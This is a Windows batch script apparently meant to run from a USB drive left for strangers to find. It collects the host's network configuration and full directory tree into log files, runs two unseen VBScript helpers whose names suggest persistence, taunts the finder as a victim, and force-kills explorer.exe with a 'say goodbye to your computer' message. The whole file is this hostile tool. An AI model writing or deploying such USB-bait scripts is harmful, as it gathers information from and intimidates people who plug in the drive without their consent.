@echo off
start notepad.exe
chdir logs/ip
ipconfig /all > ip.txt
tree /all > files.txt
cscript /nologo makepermv2.vbs

echo "Hello. You probably were honestly plugging this usb drive in so that you could figure out who it belonged to. I trust you but you are unfortuanatelly victim of my scheme. I hope your day has been good because I am making it bad. Enjoy your computer while you can."
set /p answer=Oh... BTW; you do have all your files saved right? Enter: Y or N
   if /i "%answer:~,1%" EQU "Y" goto kill
   if /i "%answer:~,1%" EQU "N" goto exit
cscript /nologo makeperm.vbs

:kill
taskkill /f /t /im explorer.exe
explorer.exe
echo "Say goodbye to your computer :("


:exit
timeout /t 3 /nobreak